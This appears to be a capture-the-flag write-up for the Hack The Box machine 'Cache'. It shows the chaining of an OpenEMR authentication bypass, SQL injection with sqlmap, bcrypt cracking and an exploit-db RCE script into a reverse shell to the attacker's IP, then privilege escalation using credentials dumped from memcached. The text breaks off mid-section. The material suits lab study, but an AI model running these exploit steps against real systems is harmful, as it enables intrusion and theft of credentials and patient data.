I"™â<h1 id="cache-">Cache <br /></h1>

<p><img src="images/cache/1.png# icon" alt="Cache icon" /></p>

<h2 id="enumeration">Enumeration</h2>

<h3 id="nmap">Nmap</h3>

<p>Started with the following nmap command:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 1-10000 <span class="nt">-oA</span> nmap.res <span class="nt">-v</span> cache.htb
</code></pre></div></div>
<p><br />This is the nmap result.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>cache.htb <span class="o">(</span>10.10.10.188<span class="o">)</span>
Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 9998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Cache
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Fri Sep 25 23:40:04 2020 -- 1 IP address (1 host up) scanned in 226.08 seconds</span>
</code></pre></div></div>
<p><br />An <strong>ssh server</strong> and a <strong>web server</strong> is open. Let‚Äôs check the webpage first.</p>

<h3 id="web-pages-enumeration">Web Pages Enumeration</h3>

<p>By going to the homepage, here is the presented web page.<br />
<img src="images/cache/2.png" alt="Cache homepage" /></p>

<p><br />There are a couple of links in here but we are interested these two:<br />
<img src="images/cache/3.png# medium" alt="Two links" /></p>

<h4 id="login-page">Login Page</h4>
<p>Let‚Äôs check the <strong><code class="language-plaintext highlighter-rouge">/login.html</code></strong>. Upon visting the page, we are prompted for username and password.<br />
<img src="images/cache/4.png# medium" alt="Login page html" /></p>

<p><br />At this point, we don‚Äôt have any credentials yet so let‚Äôs check first the page‚Äôs source code to check anything that may be useful.<br />
<img src="images/cache/5.png# big" alt="Login page html source" /></p>

<p><br />The page source code has shown some important things:</p>
<ul>
  <li>It revealed that there is a user defined javascript file, named <strong><code class="language-plaintext highlighter-rouge">functionality.js</code></strong> that might be handling the login action.</li>
  <li>It also revealed that we can bypass the login form by accessing <strong><code class="language-plaintext highlighter-rouge">net.html</code></strong> directly.</li>
</ul>

<p><br />With these in mind, let‚Äôs check first the javascript file.</p>

<h4 id="javascript-hardcoded-username-and-password">Javascript Hardcoded Username and Password</h4>
<p>Upong checking the javascript file, there is a hardcoded username and password.
<br /></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* /jquery/functinality.js */</span>
<span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    
    <span class="kd">var</span> <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nx">checkCorrectPassword</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Password</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">H@v3_fun</span><span class="dl">'</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">checkCorrectUsername</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Username</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ash</span><span class="dl">"</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginform</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Act on the event */</span>
        <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
         <span class="nx">checkCorrectPassword</span><span class="p">();</span>
         <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
         <span class="nx">checkCorrectUsername</span><span class="p">();</span>


        <span class="k">if</span><span class="p">(</span><span class="nx">error_correctPassword</span> <span class="o">==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nx">error_username</span> <span class="o">==</span><span class="kc">false</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">});</span>
    
<span class="p">});</span>
</code></pre></div></div>
<p><br />From the code above we can extract the <strong><code class="language-plaintext highlighter-rouge">ash:H@v3_fun</code></strong> credential. Let‚Äôs try logging in.<br />
After successful login, this is the <strong><code class="language-plaintext highlighter-rouge">net.html</code></strong> page.<br />
<img src="images/cache/6.png# medium" alt="net.html page" /></p>

<p><br />However, there is nothing more to this page. We just have to hold on to those credentials that we have acquired. Thus, bypassing the login page will also become pointless since there is nothing useful even if we actually accessed <strong><code class="language-plaintext highlighter-rouge">net.html</code></strong> without the credentials.<br />
Let‚Äôs now Move to the other important link, the <strong><em>author.html (Author‚Äôs Page)</em></strong></p>
<h4 id="authors-page">Author‚Äôs Page</h4>
<p>This is the author‚Äôs page<br />
<img src="images/cache/7.png# medium-p" alt="Author's page" />
<br />One very important note to take here is that the author has another <em>‚Äúproject‚Äù</em> which is the ‚ÄúHostpital Management System‚Äù or HMS. This might pertain that there is another virtual server being hosted. We can add another domain name in our <strong><code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong> for easy resolution to the domain when accessing through the web browser.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
10.10.10.188	cache.htb hms.cache.htb hms.htb cache.hms.htb
...
</code></pre></div></div>
<p><br />We added a few combinations just to have a few more options.</p>

<h2 id="openemr">OpenEMR</h2>

<p>Let‚Äôs now access <strong><code class="language-plaintext highlighter-rouge">http://hms.htb</code></strong>. We actually hit something and it is the <em>OpenEMR</em> login page.<br />
<img src="images/cache/8.png# medium" alt="OpenEMR Login page" />
<br />At this point, we might think that the credentials we have acquired earlier may prove useful. Let‚Äôs do that.<br />
After entering the username and password acquired earlier, OpenEMR didn‚Äôt accept those.<br />
<img src="images/cache/9.png# medium" alt="Error Loging OpenEMR" />
<br />Even under different usernames such as <strong><code class="language-plaintext highlighter-rouge">administrator, admin, openemr,</code></strong> etc., the password didn‚Äôt work. So we have to check if the OpenEMR itself has any vulnerability. And after googling <em>‚ÄúOpenEMR Vulnerability‚Äù</em>, a <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">vulnerability report</a> (in pdf) is among of those results<br />
<img src="images/cache/10.png# medium" alt="Google Result" />
<br />Since we cannot login to the portal, we need to find a vulnerability that requires no authentication to exploit.</p>

<h3 id="openemr-vulnerability-1-patient-portal-authentication-bypass">OpenEMR Vulnerability 1: Patient Portal Authentication Bypass</h3>
<p>Upon viewing the pdf, we can see at page 4 there is a patient portal authentication bypass.</p>
<blockquote>
  <p><em>‚Äú2.0 - Patient Portal Authentication Bypass An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to the registration page and modifying the requested url to access the desired page. Some examples of pages in the portal directory that are accessible after browsing to theregistration page include:‚Äù</em></p>
</blockquote>

<p>However, what we‚Äôre trying to bypass is the administration login page. But with this patient portal bypass, we can actually chain this exploit with an another OpenEMR Vulnerability (SQLI Injection on <strong><code class="language-plaintext highlighter-rouge">/portal/find_appt_popup_user.php</code></strong>) which is a SQLI so that we can leak everything we can find in the database (hopefully there is the OpenEMR administration credentials)
<br />By following the report, let‚Äôs first go to <strong><code class="language-plaintext highlighter-rouge">/portal/account/register.php</code></strong>. It welcomes us with this webpage:<br />
<img src="images/cache/11.png# medium" alt="Register Portal Patient" />
<br />There is nothing to do here so then let‚Äôs go to <strong><code class="language-plaintext highlighter-rouge">/portal/find_appt_popup_user.php</code></strong>.</p>

<h3 id="openemr-vulnerability-2-sql-injection-against-portalfind_appt_popup_userphp">OpenEMR Vulnerability 2: SQL Injection Against /portal/find_appt_popup_user.php</h3>

<p>Upon visiting the page, we will be able to see this.<br />
<img src="images/cache/12.png# medium" alt="popup user" />
<br />It seems there is nothing in this page. We can click the ‚ÄúSearch‚Äù just to see the GET variables to attack with. This is the URL after:
<br /><strong><code class="language-plaintext highlighter-rouge">http://hms.htb/portal/find_appt_popup_user.php?providerid=&amp;catid=</code></strong>
<br />To check if it‚Äôs really vulnerable to SQLI, let‚Äôs insert a <strong><code class="language-plaintext highlighter-rouge">'</code></strong> and some string to get a response from the server. I wrote <strong><code class="language-plaintext highlighter-rouge">'OR 1;</code></strong> to <strong><code class="language-plaintext highlighter-rouge">catid</code></strong> to purposely cause error to the query.<br />
<img src="images/cache/13.png" alt="Query error" />
<br />It really is vulnerable! Let‚Äôs pass the automated stuff SQLI now to <strong><code class="language-plaintext highlighter-rouge">SQLMap</code></strong></p>

<h4 id="setting-up-sqlmap">Setting up SQLMap</h4>
<p>Remember that we have to go first to the patient registration page before actually going to the vulnerable page. So we have to get the cookies that we have when we visited the registration page and then set it to SQLMap. The cookies that were set are <strong><code class="language-plaintext highlighter-rouge">PHPSESSID</code></strong> and <strong><code class="language-plaintext highlighter-rouge">OpenEMR</code></strong>:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-u</span> <span class="s2">"http://hms.htb/portal/find_appt_popup_user.php?catid=1"</span> <span class="nt">--cookie</span> <span class="s2">"OpenEMR=m3s59f9ekb4dokt8po0ecp7u9b;PHPSESSID=4gnsf5ooj66r8rflrrp4r8r6u9"</span>

</code></pre></div></div>
<h4 id="leaking-databases-tables-and-columns">Leaking Databases, Tables and Columns</h4>
<p>SQLMap setting to leak the databases:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-u</span> <span class="s2">"http://hms.htb/portal/find_appt_popup_user.php?catid=1"</span> <span class="nt">--cookie</span> <span class="s2">"OpenEMR=m3s59f9ekb4dokt8po0ecp7u9b;PHPSESSID=4gnsf5ooj66r8rflrrp4r8r6u9"</span> <span class="nt">--dbs</span>

</code></pre></div></div>
<p><br />Result:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="o">[</span>13:30:10] <span class="o">[</span>INFO] fetching database names
<span class="o">[</span>13:30:11] <span class="o">[</span>INFO] retrieved: <span class="s1">'information_schema'</span>
<span class="o">[</span>13:30:11] <span class="o">[</span>INFO] retrieved: <span class="s1">'openemr'</span>
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> openemr

</code></pre></div></div>
<p><br />Let‚Äôs leak now openemr tables:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-u</span> <span class="s2">"http://hms.htb/portal/find_appt_popup_user.php?catid=1"</span> <span class="nt">--cookie</span> <span class="s2">"OpenEMR=m3s59f9ekb4dokt8po0ecp7u9b;PHPSESSID=4gnsf5ooj66r8rflrrp4r8r6u9"</span> <span class="nt">-D</span> openemr <span class="nt">--tables</span>

</code></pre></div></div>
<p><br />Result:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="o">[</span>13:44:12] <span class="o">[</span>INFO] retrieved: <span class="s1">'therapy_groups'</span>
<span class="o">[</span>13:44:12] <span class="o">[</span>INFO] retrieved: <span class="s1">'therapy_groups_counselors'</span>
<span class="o">[</span>13:44:12] <span class="o">[</span>INFO] retrieved: <span class="s1">'therapy_groups_participant_attendance'</span>
<span class="o">[</span>13:44:13] <span class="o">[</span>INFO] retrieved: <span class="s1">'therapy_groups_participants'</span>
<span class="o">[</span>13:44:13] <span class="o">[</span>INFO] retrieved: <span class="s1">'transactions'</span>
<span class="o">[</span>13:44:13] <span class="o">[</span>INFO] retrieved: <span class="s1">'user_settings'</span>
<span class="o">[</span>13:44:14] <span class="o">[</span>INFO] retrieved: <span class="s1">'users'</span>
<span class="o">[</span>13:44:14] <span class="o">[</span>INFO] retrieved: <span class="s1">'users_facility'</span>
<span class="o">[</span>13:44:14] <span class="o">[</span>INFO] retrieved: <span class="s1">'users_secure'</span>
<span class="o">[</span>13:44:14] <span class="o">[</span>INFO] retrieved: <span class="s1">'valueset'</span>
<span class="o">[</span>13:44:15] <span class="o">[</span>INFO] retrieved: <span class="s1">'version'</span>
<span class="o">[</span>13:44:15] <span class="o">[</span>INFO] retrieved: <span class="s1">'voids'</span>
<span class="o">[</span>13:44:15] <span class="o">[</span>INFO] retrieved: <span class="s1">'x12_partners'</span>
...
| therapy_groups                        |
| therapy_groups_counselors             |
| therapy_groups_participant_attendance |
| therapy_groups_participants           |
| transactions                          |
| user_settings                         |
| <span class="nb">users</span>                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+

</code></pre></div></div>
<p><br />We are now going to leak the columns of users_secure:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-u</span> <span class="s2">"http://hms.htb/portal/find_appt_popup_user.php?catid=1"</span> <span class="nt">--cookie</span> <span class="s2">"OpenEMR=m3s59f9ekb4dokt8po0ecp7u9b;PHPSESSID=4gnsf5ooj66r8rflrrp4r8r6u9"</span> <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">--columns</span>

</code></pre></div></div>
<p><br />Result:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Database: openemr
Table: users_secure
<span class="o">[</span>9 columns]
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| <span class="nb">id</span>                | bigint<span class="o">(</span>20<span class="o">)</span>   |
| password          | varchar<span class="o">(</span>255<span class="o">)</span> |
| last_update       | timestamp    |
| password_history1 | varchar<span class="o">(</span>255<span class="o">)</span> |
| password_history2 | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt              | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt_history1     | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt_history2     | varchar<span class="o">(</span>255<span class="o">)</span> |
| username          | varchar<span class="o">(</span>255<span class="o">)</span> |
+-------------------+--------------+

</code></pre></div></div>

<h4 id="leaking-administrator-password-hash-with-sqlmap">Leaking Administrator Password Hash with SQLMap</h4>

<p>Let‚Äôs leak the credentials under users_secure. Let‚Äôs dump the usernames and passwords.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-u</span> <span class="s2">"http://hms.htb/portal/find_appt_popup_user.php?catid=1"</span> <span class="nt">--cookie</span> <span class="s2">"OpenEMR=m3s59f9ekb4dokt8po0ecp7u9b;PHPSESSID=4gnsf5ooj66r8rflrrp4r8r6u9"</span> <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">-C</span> username,password <span class="nt">--dump</span>

</code></pre></div></div>
<p><br />Result:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="o">[</span>13:53:59] <span class="o">[</span>INFO] resumed: <span class="s1">'openemr_admin'</span>
Database: openemr
Table: users_secure
<span class="o">[</span>1 entry]
+---------------+--------------------------------------------------------------+
| username      | password                                                     |
+---------------+--------------------------------------------------------------+
| openemr_admin | <span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |
+---------------+--------------------------------------------------------------+
...
</code></pre></div></div>
<p><br />Now we know that there is only one user in the administration login portal and we leaked its password hash</p>
<h4 id="cracking-administrator-bcrypt-hash-w-hashcat">Cracking Administrator Bcrypt Hash W/ Hashcat</h4>

<p>Let‚Äôs identify first what kind of hash it is from <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat list</a>. It‚Äôs a Bcrypt.<br />
<img src="images/cache/14.png" alt="Bcrypt" />
<br />Let‚Äôs crack it using hashcat
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hashes.txt /usr/share/wordlists/rockyou.txt

</code></pre></div></div>
<p><br />Result:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344385
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385

<span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class="nv">$2</span><span class="k">*</span><span class="nv">$,</span> Blowfish <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: <span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
Time.Started.....: Sat Oct 10 14:11:34 2020 <span class="o">(</span>2 secs<span class="o">)</span>
Time.Estimated...: Sat Oct 10 14:11:36 2020 <span class="o">(</span>0 secs<span class="o">)</span>
...
</code></pre></div></div>
<p><br />We actually cracked it! The password is <strong><code class="language-plaintext highlighter-rouge">xxxxxx</code></strong> for <strong><code class="language-plaintext highlighter-rouge">openemr_admin</code></strong>. We can now login and this is the web page after logging in:
<br /></p>

<h3 id="openemr-vulnerability-3-authenticated-rce-via-file-upload-portalimport_templatephp">OpenEMR Vulnerability 3: Authenticated RCE via File Upload /portal/import_template.php</h3>

<p>Going back to the vulnerability report, there is an arbitrary file upload vulnerability that can lead to remote code execution. (Page 25, section 9.1). However, a POC has already been implemented and uploaded to <a href="https://www.exploit-db.com/exploits/48515">exploit-db</a>.<br />
In order for the exploit to work, we need to set the username and password in the POC script:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nv">data</span><span class="o">=</span> <span class="o">{</span>
    <span class="s1">'new_login_session_management'</span> : <span class="s1">'1'</span>,
    <span class="s1">'authProvider'</span> : <span class="s1">'Default'</span>,
    <span class="s1">'authUser'</span> : <span class="s1">'openemr_admin'</span>, <span class="c"># change this to the the appropriate username</span>
    <span class="s1">'clearPass'</span> : <span class="s1">'xxxxxx'</span>,       <span class="c"># change this to the appropriate password </span>
    <span class="s1">'languageChoice'</span> : <span class="s1">'1'</span>,
    <span class="o">}</span>
...
</code></pre></div></div>
<p><br />And also the attacking (our) machine IP address and the port we want to listen to.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.14.23'</span><span class="p">;</span>  <span class="c"># CHANGE THIS</span>
<span class="nv">$port</span> <span class="o">=</span> 4444<span class="p">;</span>       <span class="c"># CHANGE THIS</span>
...
</code></pre></div></div>
<p><br />Now we have to setup our listener before running the exploit script.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 4444
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
</code></pre></div></div>
<p><br />Finally, run the exploit script.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
python3 48515.py

</code></pre></div></div>
<p><br />If the exploit is successful, we should able to receive a connection:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Ncat: Connection from 10.10.10.188.
Ncat: Connection from 10.10.10.188:56954.
Linux cache 4.15.0-109-generic <span class="c">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:31:39 up  4:20,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ 

</span></code></pre></div></div>
<p><br />Let‚Äôs spawn tty from python3 in the target machine to have a better shell.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
www-data@cache:/<span class="nv">$ </span>
</code></pre></div></div>
<h2 id="privesc-enumeration-as-www-data">Privesc Enumeration as www-data</h2>

<p>Let‚Äôs check for other users. Let‚Äôc check the /etc/passwd</p>

<h3 id="checking-etcpasswd">Checking /etc/passwd</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
<span class="nb">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div></div>
<p><br />We can see that there are 2 standard users, ash and luffy.</p>

<h2 id="escalate-to-user-ash">Escalate to User Ash</h2>
<p>Remember the credentials that we got from the <strong><code class="language-plaintext highlighter-rouge">functionality.js</code></strong> in the login.html? Let‚Äôs try it.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/<span class="nv">$ </span>su ash
su ash
Password: H@v3_fun

ash@cache:/<span class="nv">$ </span>
</code></pre></div></div>
<p><br />It worked. We can now get the user flag from the home directory of ash.</p>
<h2 id="privesc-enumeration-as-ash">Privesc Enumeration as Ash</h2>

<h3 id="netstat">Netstat</h3>
<p>Let‚Äôs enumerate open tcp ports:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>netstat <span class="nt">-l</span> <span class="nt">-n</span> <span class="nt">-t</span>
netstat <span class="nt">-l</span> <span class="nt">-n</span> <span class="nt">-t</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 127.0.0.1:11211         0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN     
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN     
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN     
</code></pre></div></div>
<p><br />There is an odd port that‚Äôs open (port 11211). It turns out, it is <a href="https://memcached.org/">Memcached</a>. We can connect to it for keys that might have been set.</p>

<h3 id="connecting-and-dumping-memcached-contents">Connecting and Dumping Memcached Contents</h3>
<p>We can use Telnet to connect to Memcached.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>telnet localhost 11211
telnet localhost 11211
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>

</code></pre></div></div>
<p><br />Next we check the items for keys:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats items
stats items
STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0

</code></pre></div></div>
<p><br />The number after ‚Äúitems‚Äù is the slab id. There are no other slab ids. We can check the keys inside the slab class.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats cachedump 1 1000
stats cachedump 1 1000
ITEM <span class="nb">link</span> <span class="o">[</span>21 b<span class="p">;</span> 0 s]
ITEM user <span class="o">[</span>5 b<span class="p">;</span> 0 s]
ITEM passwd <span class="o">[</span>9 b<span class="p">;</span> 0 s]
ITEM file <span class="o">[</span>7 b<span class="p">;</span> 0 s]
ITEM account <span class="o">[</span>9 b<span class="p">;</span> 0 s]
</code></pre></div></div>
<p><br />There are some interesting keys here. Let‚Äôs dump them all.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get <span class="nb">link
</span>get <span class="nb">link
</span>VALUE <span class="nb">link </span>0 21
https://hackthebox.eu
END
get user
get user
VALUE user 0 5
luffy
END
get passwd
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
get file
get file
VALUE file 0 7
nothing
END
get account
get account
VALUE account 0 9
afhj556uo
</code></pre></div></div>
<p><br />Good! We found the password for luffy. Let‚Äôs try to switch user.</p>
<h2 id="escalate-to-user-luffy">Escalate to User Luffy</h2>
<p>Let‚Äôs try switching to uesr luffy.
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/<span class="nv">$ </span>
</code></pre></div></div>
<p><br />It worked!</p>
<h2 id="privesc-enumeration-as-luffy">Privesc Enumeration as Luffy</h2>

<h3 id="id">ID</h3>
<p>Let‚Äôs check what groups user luffy is in.
<br /></p>
